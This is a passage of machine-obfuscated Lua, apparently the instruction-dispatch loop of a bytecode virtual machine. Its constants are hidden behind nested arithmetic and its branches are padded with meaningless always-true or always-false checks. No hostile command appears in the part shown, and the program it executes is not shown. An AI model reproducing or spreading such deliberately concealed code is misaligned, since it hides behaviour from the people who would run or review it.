+ 2 ];v70=v70 + (801 -(24 + 776)) ;v78=v66[v70];v589=19;end if ((612<1082) and (v589==13)) then v591=v78[2 -0 ];v76[v591]=v76[v591](v13(v76,v591 + (786 -(222 + 563)) ,v78[6 -3 ]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[192 -(23 + 167) ]][v78[3]]=v76[v78[1802 -(690 + 1108) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + (3 -2) ]]=v76[v78[3]];v589=12 + (1035 -(912 + 121)) ;end if (21==v589) then v591=v78[850 -(40 + 808) ];v76[v591]=v76[v591](v13(v76,v591 + 1 + 0 ,v78[3]));v70=v70 + 1 ;v78=v66[v70];v76[v78[7 -5 ]][v78[3 + 0 + 0 ]]=v76[v78[3 + 1 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(1291 -(1140 + 149)) + 0 ]]=v76[v78[3]];v589=593 -(47 + 524) ;end if ((2142==2142) and (v589==7)) then v591=v78[2 + 0 + 0 ];v76[v591]=v76[v591](v13(v76,v591 + (2 -1) ,v78[4 -1 ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[1728 -(1165 + 561) ]][v78[3]]=v76[v78[1 + 3 ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[482 -(341 + 138) ]];v589=8;end if (v589==(8 + 20)) then v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[328 -(89 + 237) ]]=v78[9 -6 ];v70=v70 + 1 ;v78=v66[v70];v76[v78[3 -1 ]]=v78[3];v70=v70 + (882 -(581 + 300)) ;v78=v66[v70];v589=1249 -((1139 -284) + 365) ;end if (v589==16) then v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[1 + 0 + 1 ]]=v78[(4236 -2998) -(1030 + 205) ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[289 -(156 + 130) ];v70=v70 + 1 ;v78=v66[v70];v589=38 -21 ;end if (v589==(50 -20)) then v70=v70 + ((1 -0) -0) ;v78=v66[v70];v76[v78[1 + 0 + 1 ]]=v60[v78[2 + 1 ]];v70=v70 + (70 -(10 + 59)) ;v78=v66[v70];v591=v78[1 + 1 ];v590=v76[v78[14 -(38 -27) ]];v76[v591 + (1164 -(671 + 492)) ]=v590;v589=25 + 6 ;end if ((v589==(1230 -(369 + 846))) or (1680<749)) then v591=v78[188 -(165 + 21) ];v76[v591]=v76[v591](v13(v76,v591 + 1 ,v78[1 + 2 ]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1947 -(1036 + 909) ]][v78[3 + 0 ]]=v76[v78[6 -(113 -(61 + 50)) ]];v70=v70 + (204 -(11 + 192)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[3]];v589=16;end if (v589==(204 -(135 + 40))) then v591=v78[4 -2 ];v76[v591]=v76[v591](v13(v76,v591 + 1 + 0 ,v78[6 -3 ]));v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[178 -(50 + 126) ]][v78[8 -5 ]]=v76[v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1415 -(1233 + 180) ]]={};v589=999 -(522 + 447) ;end if (v589==(1453 -(45 + 62 + 1314))) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[5 -(14 -11) ]]=v78[2 + 1 ]~=(0 -0) ;break;end if (v589==2) then v70=v70 + 1 ;v78=v66[v70];v76[v78[3 -1 ]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v76[v78[7 -5 ]]=v78[1913 -(716 + 1194) ];v70=v70 + 1 + 0 ;v78=v66[v70];v589=1 + 2 ;end if (v589==5) then v591=v78[2];v76[v591]=v76[v591](v13(v76,v591 + ((199 + 305) -(74 + 429)) ,v78[3]));v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[1462 -(1295 + 165) ]][v78[2 + 1 ]]=v76[v78[8 -4 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[5 -3 ]]=v76[v78[7 -(1 + 3) ]];v589=6;end if (v589==(442 -(279 + 154))) then v591=v78[780 -(454 + 324) ];v76[v591]=v76[v591](v13(v76,v591 + 1 ,v78[3 + 0 ]));v70=v70 + (18 -(12 + 5)) ;v78=v66[v70];v76[v78[2 + 0 ]][v78[3]]=v76[v78[10 -6 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v76[v78[1096 -(277 + 816) ]];v589=42 -32 ;end if ((1209 -(1058 + 125))==v589) then v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[2 + 1 ];v70=v70 + (976 -((2212 -(819 + 578)) + 160)) ;v78=v66[v70];v76[v78[8 -6 ]]=v78[7 -4 ];v70=v70 + 1 + 0 ;v78=v66[v70];v589=78 -(1453 -(331 + 1071)) ;end if ((v589==((2655 -(588 + 155)) -(41 + 1857))) or (2012<213)) then v70=v70 + (1894 -(1222 + (1953 -(546 + 736)))) ;v78=v66[v70];v76[v78[5 -3 ]]=v78[(1940 -(1834 + 103)) -0 ];v70=v70 + (1183 -(229 + 953)) ;v78=v66[v70];v76[v78[1776 -(1111 + 663) ]]=v78[1582 -(874 + 705) ];v70=v70 + 1 ;v78=v66[v70];v589=15;end if (v589==20) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[6 -3 ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[(419 + 262) -(642 + 37) ]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v589=5 + 16 ;end if (v589==(2 -1)) then v591=v78[2];v76[v591]=v76[v591](v13(v76,v591 + 1 ,v78[1 + 2 ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[456 -(233 + 221) ]][v78[6 -3 ]]=v76[v78[4 + 0 ]];v70=v70 + (1542 -((2484 -(1536 + 230)) + 823)) ;v78=v66[v70];v76[v78[2]]=v76[v78[494 -(128 + 363) ]];v589=2 + 0 ;end if (v589==(832 -(266 + 539))) then v591=v78[(2 + 3) -3 ];v76[v591]=v76[v591](v13(v76,v591 + (1226 -(636 + 589)) ,v78[7 -4 ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[3 -1 ]][v78[3 + 0 ]]=v76[v78[1 + 1 + 2 ]];v70=v70 + (1016 -(657 + 358)) ;v78=v66[v70];v76[v78[(6 -2) -2 ]]=v76[v78[6 -(8 -5) ]];v589=1215 -(1151 + 36) ;end if ((4516>=2342) and (v589==((55 -32) + 0))) then v591=v78[1 + 0 + 1 ];v76[v591]=v76[v591](v13(v76,v591 + (2 -1) ,v78[1835 -(1552 + 280) ]));v70=v70 + (835 -(64 + 770)) ;v78=v66[v70];v76[v78[2 + 0 ]][v78[6 -3 ]]=v76[v78[1 + 3 ]];v70=v70 + (1244 -(157 + 1086)) ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[1012 -(615 + 394) ]];v589=24;end if (v589==12) then v70=v70 + ((4 + 0) -3) ;v78=v66[v70];v76[v78[2 -0 ]]=v78[3 -0 ];v70=v70 + (820 -(599 + 220)) ;v78=v66[v70];v76[v78[3 -1 ]]=v78[1934 -(1813 + 118) ];v70=v70 + 1 + 0 + 0 ;v78=v66[v70];v589=1230 -(841 + 376) ;end end end elseif (v79<=((188 -126) -17)) then if ((v79==(11 + 33)) or (2402==3445)) then do return;end else local v355;local v356;v76[v78[5 -3 ]]=v59[v78[862 -(464 + 395) ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[3]][v78[4]];v70=v70 + ((3800 -2962) -(467 + 370)) ;v78=v66[v70];v76[v78[3 -1 ]]=v59[v78[3 + 0 ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[2]]=v76[v78[1 + 2 ]][v78[8 -4 ]];v70=v70 + (521 -(150 + 370)) ;v78=v66[v70];v356=v78[(1935 -(59 + 592)) -(74 + 1208) ];v76[v356](v13(v76,v356 + (2 -1) ,v78[3]));v70=v70 + (4 -3) ;v78=v66[v70];v76[v78[2 + 0 ]]=v59[v78[3]];v70=v70 + 1 ;v78=v66[v70];v356=v78[2];v355=v76[v78[3]];v76[v356 + (391 -(14 + (832 -456))) ]=v355;v76[v356]=v355[v78[4]];v70=v70 + (1 -0) ;v78=v66[v70];v356=v78[2];v76[v356](v76[v356 + 1 + 0 ]);v70=v70 + 1 + 0 ;v78=v66[v70];v70=v78[3 + 0 ];end elseif (v79<=(134 -88)) then if (v78[2]==v76[v78[4 + 0 ]]) then v70=v70 + (79 -(23 + 55)) ;else v70=v78[6 -(4 -1) ];end elseif (v79>(32 + 15)) then local v593=v78[2 + 0 ];v76[v593]=v76[v593](v13(v76,v593 + ((1 + 0) -(171 -(70 + 101))) ,v71));else local v595;local v596;v76[v78[1 + 1 ]]=v76[v78[(2234 -1330) -(652 + 249) ]][v78[10 -(5 + 1) ]];v70=v70 + ((4693 -2824) -(708 + 1160)) ;v78=v66[v70];v596=v78[5 -3 ];v76[v596]=v76[v596]();v70=v70 + ((242 -(123 + 118)) -0) ;v78=v66[v70];v76[v78[29 -(10 + 17) ]]=v59[v78[1 + 2 ]];v70=v70 + (1733 -(1400 + 332)) ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[1911 -(242 + 1666) ]] -v76[v78[4]] ;v70=v70 + 1 + 0 ;v78=v66[v70];v59[v78[2 + 1 ]]=v76[v78[2 + 0 ]];v70=v70 + 1 ;v78=v66[v70];v596=v78[2];v595=v76[v78[943 -(850 + 90) ]];v76[v596 + (1 -0) ]=v595;v76[v596]=v595[v78[4]];v70=v70 + (1391 -(360 + 1030)) ;v78=v66[v70];v596=v78[2 + 0 ];v76[v596](v76[v596 + (2 -1) ]);v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 -0 ]]=v78[1664 -(909 + 752) ];end elseif (v79<=(1276 -(2 + 107 + 1114))) then if ((160<=3550) and (v79<=50)) then if ((149<3450) and (v79>(89 -40))) then v76[v78[1 + 1 ]][v76[v78[245 -(6 + 236) ]]]=v76[v78[3 + (1400 -(653 + 746)) ]];else v76[v78[(3 -1) + 0 ]]= #v76[v78[6 -3 ]];end elseif (v79<=(73 -22)) then local v378;local v379,v380;local v381;local v382;v76[v78[3 -1 ]]=v59[v78[3]];v70=v70 + (1134 -(1076 + 57)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[692 -(579 + 110) ]][v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[2 + 1 ];v70=v70 + 1 ;v78=v66[v70];v382=v78[409 -(174 + 233) ];v381=v76[v78[8 -5 ]];v76[v382 + ((2 -1) -0) ]=v381;v76[v382]=v381[v78[2 + 2 ]];v70=v70 + (1175 -(663 + 511)) ;v78=v66[v70];v76[v78[2 + 0 ]]= #v76[v78[1 + 2 ]];v70=v70 + (2 -1) ;v78=v66[v70];v382=v78[2 + 0 ];v379,v380=v69(v76[v382](v13(v76,v382 + (2 -1) ,v78[7 -4 ])));v71=(v380 + v382) -(1 + 0) ;v378=(0 + 0) -0 ;for v508=v382,v71 do local v509=0 + 0 + 0 ;while true do if (v509==(0 + 0)) then v378=v378 + ((632 + 91) -(59 + 419 + 244)) ;v76[v508]=v379[v378];break;end end end v70=v70 + (518 -(440 + 77)) ;v78=v66[v70];v382=v78[1 + 1 ];v76[v382](v13(v76,v382 + (3 -2) ,v71));v70=v70 + (1557 -(655 + 901)) ;v78=v66[v70];v76[v78[1 + 1 + 0 ]]={};v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[3 + 0 ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[1447 -(695 + 750) ]]=v78[9 -6 ];elseif (v79==(79 -27)) then local v614=0 -0 ;local v615;while true do if (v614==(353 -(285 + 66))) then v78=v66[v70];v615=v78[2];v76[v615]=v76[v615]();v614=6 -3 ;end if ((v614==((3218 -1905) -(682 + 628))) or (3406<2659)) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v76[v78[3 + 0 ]];v614=303 -((324 -148) + 123) ;end if (v614==(1 + 0)) then v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[3]][v78[(1507 -(885 + 349)) -(239 + 30) ]];v70=v70 + 1 ;v614=2;end if (v614==(2 + 2)) then v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3 + 0 ];break;end if ((3445==3445) and (v614==0)) then v615=nil;v76[v78[3 -1 ]]=v60[v78[8 -5 ]];v70=v70 + (316 -(306 + 9)) ;v614=3 -(2 + 0) ;end end else local v616=0 + 0 ;local v617;local v618;local v619;local v620;while true do if (v616==(1 + 0)) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[5 -3 ]]=v60[v78[1378 -(1140 + 235) ]];v70=v70 + 1 + 0 ;v616=2;end if ((4871==4871) and (v616==((13 -8) + 0))) then v78=v66[v70];v76[v78[1 + 1 ]]=v60[v78[3]];v70=v70 + (53 -(33 + 19)) ;v78=v66[v70];v616=3 + 3 ;end if (v616==((31 -20) -7)) then v70=v70 + 1 ;v78=v66[v70];v76[v78[(969 -(915 + 53)) + 1 ]]=v76[v78[5 -2 ]];v70=v70 + 1 ;v616=5 + 0 ;end if ((v616==2) or (2384<828)) then v78=v66[v70];v76[v78[691 -((1387 -(768 + 33)) + 103) ]]=v76[v78[3]][v78[4]];v70=v70 + 1 + (0 -0) ;v78=v66[v70];v616=9 -6 ;end if (v616==((2629 -1135) -(1309 + 179))) then v76[v78[(330 -(287 + 41)) -(847 -(638 + 209)) ]]=v76[v78[2 + 1 ]][v78[4]];v70=v70 + (2 -(1 + 0)) ;v78=v66[v70];v620=v78[2 + 0 ];v616=14 -7 ;end if (v616==(17 -8)) then v78=v66[v70];v76[v78[611 -((1981 -(96 + 1590)) + 314) ]]=v76[v78[3]];v70=v70 + (2 -1) ;v78=v66[v70];v616=1972 -((2972 -(741 + 931)) + 662) ;end if (((37 -25)==v616) or (3490>=3857)) then v76[v620](v13(v76,v620 + 1 + 0 ,v71));v70=v70 + ((5002 -3246) -(1178 + 577)) ;v78=v66[v70];do return;end break;end if (v616==(6 + 5)) then for v1177=v620,v71 do local v1178=0;while true do if (v1178==0) then v617=v617 + (2 -1) ;v76[v1177]=v618[v617];break;end end end v70=v70 + (1406 -(851 + 554)) ;v78=v66[v70];v620=v78[2 + 0 ];v616=(149 -117) -20 ;end if ((v616==(14 -7)) or (1930==3490)) then v76[v620]=v76[v620]();v70=v70 + (303 -(115 + 81 + 106)) ;v78=v66[v70];v76[v78[2]]=v59[v78[3]];v616=8;end if (v616==(3 + 0)) then v76[v78[2 + 0 ]]=v59[v78[11 -(4 + 4) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1163 -(160 + 1001) ]]=v76[v78[3 + 0 ]][v78[3 + 1 ]];v616=7 -3 ;end if ((284==284) and (v616==(358 -(237 + 121)))) then v617=nil;v618,v619=nil;v620=nil;v76[v78[899 -(525 + 372) ]]=v60[v78[4 -1 ]];v616=3 -2 ;end if (v616==(150 -(96 + 46))) then v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[780 -(643 + 134) ]] -v76[v78[2 + 2 ]] ;v70=v70 + (2 -1) ;v616=33 -24 ;end if ((2448>1585) and (v616==(10 + 0))) then v620=v78[3 -1 ];v618,v619=v69(v76[v620](v13(v76,v620 + (1 -0) ,v78[3])));v71=(v619 + v620) -(720 -(316 + (1529 -1126))) ;v617=0 + 0 ;v616=(10 + 20) -19 ;end end end elseif ((3970>289) and (v79<=(20 + 35))) then if (v79==(135 -81)) then v76[v78[2]]=v76[v78[2 + 1 + 0 ]]%v78[4] ;else local v402;local v403;v76[v78[2]]=v59[v78[1 + 2 ]];v70=v70 + (3 -2) ;v78=v66[v70];v403=v78[9 -7 ];v402=v76[v78[3]];v76[v403 + ((4 -3) -0) ]=v402;v76[v403]=v402[v78[4 + 0 ]];v70=v70 + (495 -(64 + 430)) + 0 + 0 ;v78=v66[v70];v76[v78[3 -1 ]]=v59[v78[1 + (365 -(106 + 257)) ]];v70=v70 + (2 -(1 + 0)) ;v78=v66[v70];v76[v78[19 -(12 + 5) ]]=v76[v78[11 -8 ]][v78[4]];v70=v70 + (1 -0) ;v78=v66[v70];v403=v78[3 -1 ];v76[v403]=v76[v403](v13(v76,v403 + (2 -1) ,v78[1 + 2 ]));v70=v70 + (1974 -(1656 + (1038 -(496 + 225)))) ;v78=v66[v70];if v76[v78[(3 -1) + 0 ]] then v70=v70 + 1 + 0 ;else v70=v78[3];end end elseif ((4729==4729) and (v79<=(148 -(448 -356)))) then local v417=v78[2];local v418=v76[v78[14 -11 ]];v76[v417 + 1 ]=v418;v76[v417]=v418[v78[(2016 -(256 + 1402)) -((1904 -(30 + 1869)) + (1718 -(213 + 1156))) ]];elseif (v79>(270 -213)) then v76[v78[1273 -(266 + 1005) ]][v76[v78[(190 -(96 + 92)) + 1 ]]]=v78[4];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v59[v78[10 -7 ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[1698 -(561 + 1135) ]]=v59[v78[3]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[6 -4 ]]= #v76[v78[3]];v70=v70 + (1067 -(507 + 559)) ;v78=v66[v70];v76[v78[4 -(1 + 1) ]]=v76[v78[9 -6 ]] + v78[392 -(212 + 176) ] ;v70=v70 + (906 -(250 + 655)) ;v78=v66[v70];v76[v78[5 -3 ]][v76[v78[5 -2 ]]]=v76[v78[5 -1 ]];v70=v70 + (1957 -(1869 + 87)) ;v78=v66[v70];v70=v78[10 -7 ];else v76[v78[1903 -(484 + 1417) ]]=v76[v78[6 -3 ]]%v76[v78[4]] ;end elseif (v79<=(967 -(142 + 757))) then if (v79<=(104 -(34 + 7))) then if ((1189==1189) and (v79<=(833 -(48 + 725)))) then if ((v79>(95 -36)) or (4168<=1718)) then local v422=v78[5 -3 ];local v423=v76[v422];for v510=v422 + 1 + 0 ,v78[7 -4 ] do v7(v423,v76[v510]);end else local v424=0 + 0 ;local v425;local v426;local v427;while true do if (v424==(1 + 1)) then v70=v70 + (854 -(152 + 701)) ;v78=v66[v70];v76[v78[1313 -(430 + 881) ]]=v60[v78[3]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[(367 + 530) -(557 + 338) ]]=v76[v78[1 + 2 ]][v78[4]];v70=v70 + (2 -1) ;v78=v66[v70];v424=(89 -(32 + 47)) -7 ;end if (((2 -1)==v424) or (2379>3094)) then v78=v66[v70];v76[v78[4 -2 ]]=v76[v78[804 -(499 + 302) ]][v78[870 -(39 + 827) ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[4 -2 ]]=v60[v78[3]];v70=v70 + ((1980 -(1053 + 924)) -2) ;v78=v66[v70];v76[v78[2 -0 ]]=v76[v78[3]][v78[4]];v424=1 + 1 ;end if (v424==(11 -7)) then v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[4 -1 ]][v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 -0 ]]=v60[v78[107 -(103 + 1) ]];v70=v70 + (555 -(475 + 79)) ;v78=v66[v70];v76[v78[4 -2 ]]=v76[v78[9 -6 ]][v78[1 + (1651 -(685 + 963)) ]];v424=5 + (0 -0) ;end if ((4075<=4717) and (7==v424)) then v78=v66[v70];v76[v78[2]]=v76[v78[(2348 -842) -(1395 + 108) ]][v78[4]];v70=v70 + (2 -(1710 -(541 + 1168))) ;v78=v66[v70];v427=v78[1206 -(7 + 1197) ];v426=v76[v427];v425=v78[2 + 1 ];for v860=1598 -(645 + 952) ,v425 do v426[v860]=v76[v427 + v860 ];end break;end if (v424==(2 + 1)) then v76[v78[321 -(27 + 292) ]]=v60[v78[3]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2]]=v76[v78[3 -(838 -(669 + 169)) ]][v78[16 -12 ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2]]=v60[v78[5 -2 ]];v70=v70 + (140 -(43 + 96)) ;v424=4;end if ((1472==1472) and (v424==(20 -15))) then v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2 + 0 ]]=v60[v78[(3 -2) + (3 -1) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[2 + 1 ]][v78[4]];v70=v70 + (1 -0) ;v78=v66[v70];v424=2 + 4 ;end if (v424==(0 + 0)) then v425=nil;v426=nil;v427=nil;v76[v78[1753 -(478 + 936 + 337) ]]={};v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1942 -(1642 + 298) ]]=v60[v78[3]];v70=v70 + (2 -1) ;v424=2 -1 ;end if (v424==6) then v76[v78[5 -3 ]]=v60[v78[(766 -(181 + 584)) + 2 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(1397 -(665 + 730)) + 0 ]]=v76[v78[975 -(357 + 615) ]][v78[11 -7 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[4 -(3 -1) ]]=v60[v78[3]];v70=v70 + 1 + 0 ;v424=14 -7 ;end end end elseif (v79<=((1399 -(540 + 810)) + 12)) then v76[v78[(3 -2) + 1 ]]=v76[v78[2 + 1 ]] -v76[v78[1305 -(384 + (2521 -1604)) ]] ;elseif (v79>((604 + 155) -(128 + 569))) then local v635=1543 -(1407 + 136) ;local v636;local v637;local v638;while true do if (v635==0) then v636=nil;v637=nil;v638=nil;v76[v78[1889 -(687 + 1200) ]]={};v635=1;end if (v635==(1711 -(556 + 1154))) then v70=v70 + ((206 -(166 + 37)) -2) ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + (96 -(9 + 86)) ;v635=423 -((2156 -(22 + 1859)) + 146) ;end if (v635==(1 + 2)) then v76[v78[66 -(29 + 35) ]]=v78[13 -10 ];v70=v70 + 1 ;v78=v66[v70];v638=v78[5 -3 ];v635=17 -(1785 -(843 + 929)) ;end if ((4520>4486) and (v635==(3 + 1))) then v637=v76[v638];v636=v76[v638 + (1014 -(53 + 959)) ];if (v636>(408 -(312 + (358 -(30 + 232))))) then if ((v637>v76[v638 + (1 -(0 -0)) ]) or (622>1409)) then v70=v78[288 -(147 + 138) ];else v76[v638 + (902 -(813 + 86)) ]=v637;end elseif ((v637<v76[v638 + 1 ]) or (2065==4654)) then v70=v78[3];else v76[v638 + 3 + (777 -(55 + 722)) ]=v637;end break;end if (v635==(3 -1)) then v78=v66[v70];v76[v78[3 -1 ]]= #v76[v78[3]];v70=v70 + (493 -(18 + 474)) ;v78=v66[v70];v635=2 + 1 ;end end else local v639=0 -0 ;local v640;local v641;local v642;while true do if (v639==6) then v78=v66[v70];v70=v78[1089 -(860 + 226) ];break;end if ((v639==((1978 -(78 + 1597)) -(121 + 41 + 141))) or (4584<2479)) then v640=nil;v641=nil;v642=nil;v76[v78[1 + 1 ]]=v76[v78[1243 -(988 + 252) ]][v78[4]];v70=v70 + 1 + 0 ;v639=1 + 0 + 0 ;end if ((1753>=1055) and (v639==(1974 -(49 + 1921)))) then v70=v70 + (891 -(223 + 667)) ;v78=v66[v70];v641=v78[(47 + 8) -(51 + (550 -(305 + 244))) ];v640=v76[v641];for v1179=v641 + 1 ,v78[(6 + 0) -2 ] do v640=v640   .. v76[v1179] ;end v639=(115 -(95 + 10)) -5 ;end if ((2136>=510) and ((1130 -(146 + 979))==v639)) then v76[v78[1 + 1 ]]=v640;v70=v70 + (606 -(311 + 209 + 85)) ;v78=v66[v70];v76[v78[5 -3 ]]=v78[2 + 1 ];v70=v70 + (1444 -(496 + 947)) ;v639=1364 -(1233 + 125) ;end if (v639==3) then v76[v78[2]]=v78[2 + 1 ]~=0 ;v70=v70 + 1 ;v78=v66[v70];v642=v78[2];v76[v642]=v76[v642](v13(v76,v642 + 1 ,v78[3 + 0 ]));v639=1 + 3 ;end if ((2377<2472) and (v639==(1647 -(963 + 682)))) then v641=v76[v78[3 + 0 ]];v76[v642 + 1 ]=v641;v76[v642]=v641[v78[1508 -(504 + 1000) ]];v70=v70 + 1 ;v78=v66[v70];v639=3 + 0 ;end if (v639==1) then v78=v66[v70];v76[v78[2]]=v59[v78[3 + 0 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v642=v78[2 -0 ];v639=2 + 0 ;end end end elseif (v79<=(38 + 27)) then if (v79==(246 -(156 + 26))) then local v429;v76[v78[2 + 0 ]]=v59[v78[3]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[166 -(149 + 15) ]]=v76[v78[963 -(890 + 70) ]][v78[121 -(39 + 78) ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[(661 -177) -(14 + (1230 -(592 + 170))) ]]=v59[v78[6 -(10 -7) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(12 -7) -3 ]]=v76[v78[2 + 1 ]][v78[3 + 1 ]];v70=v70 + 1 ;v78=v66[v70];v429=v78[2];v76[v429](v13(v76,v429 + 1 + 0 ,v78[3]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[5 -2 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[6 -4 ]]=v59[v78[1 + 2 ]];v70=v70 + (52 -(12 + 39)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[9 -6 ]][v78[4]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[1 + 1 ]]=v59[v78[2 + 1 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v76[v78[7 -4 ]][v78[3 + 1 + 0 ]];v70=v70 + (4 -3) ;v78=v66[v70];v429=v78[1712 -(1596 + (275 -161)) ];v76[v429](v13(v76,v429 + (2 -1) ,v78[716 -(164 + 549) ]));v70=v70 + (1439 -(1059 + 379)) ;v78=v66[v70];v76[v78[2 -(0 + 0) ]]=v78[2 + 1 ];v70=v70 + (1 -0) + 0 ;v78=v66[v70];v70=v78[395 -(145 + 247) ];else v76[v78[2]]=v78[3 + 0 ];end elseif ((v79<=(31 + 35)) or (2764>2956)) then local v454=v78[2];local v455=v76[v454 + (5 -3) ];local v456=v76[v454] + v455 ;v76[v454]=v456;if (v455>(0 + 0)) then if (v456<=v76[v454 + 1 + 0 ]) then v70=v78[4 -1 ];v76[v454 + (723 -(254 + 466)) ]=v456;end elseif (v456>=v76[v454 + ((1068 -(353 + 154)) -(544 + 16)) ]) then local v865=0 -0 ;while true do if (v865==0) then v70=v78[3];v76[v454 + (631 -(294 + 334)) ]=v456;break;end end end elseif ((3192<=3445) and (v79>67)) then v76[v78[255 -(236 + 17) ]][v76[v78[(2 -0) + 1 ]]]=v78[4];else v76[v78[2 + 0 ]]={};v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[9 -7 ]]=v60[v78[2 + (1 -0) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v76[v78[3 + 0 ]][v78[798 -(324 + 89 + 381) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[3 -1 ]]=v60[v78[7 -(3 + 1) ]];v70=v70 + (1971 -((840 -258) + (2627 -1239))) ;v78=v66[v70];v76[v78[2 -0 ]]=v76[v78[3 + 0 ]][v78[368 -(326 + 38) ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2 -0 ]]=v60[v78[623 -(47 + 573) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[12 -9 ]][v78[5 -1 ]];v70=v70 + (1665 -((2957 -1688) + (481 -(7 + 79)))) ;v78=v66[v70];v76[v78[494 -(76 + 416) ]]=v60[v78[3]];v70=v70 + (444 -(319 + 59 + 65)) ;v78=v66[v70];if  not v76[v78[(185 -(24 + 157)) -2 ]] then v70=v70 + (1008 -(564 + 443)) ;else v70=v78[7 -4 ];end end elseif (v79<=(531 -(337 + 121))) then if ((4775>3465) and (v79<=(205 -135))) then if (v79>(229 -160)) then local v458=1911 -((2516 -1255) + 650) ;local v459;local v460;while true do if ((v458==1) or (3711<507)) then for v867=1 + 0 , #v75 do local v868=v75[v867];for v1168=0 -0 , #v868 do local v1169=1817 -((1646 -874) + 297 + 748) ;local v1170;local v1171;local v1172;while true do if (v1169==(0 + 0)) then v1170=v868[v1168];v1171=v1170[145 -(102 + 42) ];v1169=1845 -(1524 + 320) ;end if (v1169==(1271 -((2825 -1776) + 221))) then v1172=v1170[158 -((398 -(262 + 118)) + 138) ];if ((v1171==v76) and (v1172>=v459)) then local v1198=0;while true do if (v1198==((1083 -(1038 + 45)) -0)) then v460[v1172]=v1171[v1172];v1170[1103 -(67 + 1035) ]=v460;break;end end end break;end end end end break;end if (v458==(0 -0)) then v459=v78[350 -(136 + 212) ];v460={};v458=4 -3 ;end end else local v461;v76[v78[2 + 0 ]]=v59[v78[3]];v70=v70 + (231 -(19 + 211)) + 0 ;v78=v66[v70];v76[v78[1606 -(240 + 1364) ]]=v76[v78[1085 -(1050 + 32) ]][v78[14 -10 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1057 -(331 + 724) ]]=v59[v78[(114 -(88 + 25)) + 2 ]];v70=v70 + (645 -(269 + 375)) ;v78=v66[v70];v76[v78[727 -(267 + 458) ]]=v76[v78[1 + 2 ]][v78[7 -3 ]];v70=v70 + (819 -(667 + (384 -233))) ;v78=v66[v70];v461=v78[2];v76[v461](v13(v76,v461 + 1 ,v78[1500 -(700 + 710 + 87) ]));v70=v70 + (1898 -(1504 + 393)) ;v78=v66[v70];v76[v78[5 -3 ]]=v78[7 -4 ];v70=v70 + (797 -(461 + 335)) ;v78=v66[v70];v70=v78[1 + 2 ];end elseif ((3276<=4677) and (v79<=(1832 -(1730 + 31)))) then local v475=1667 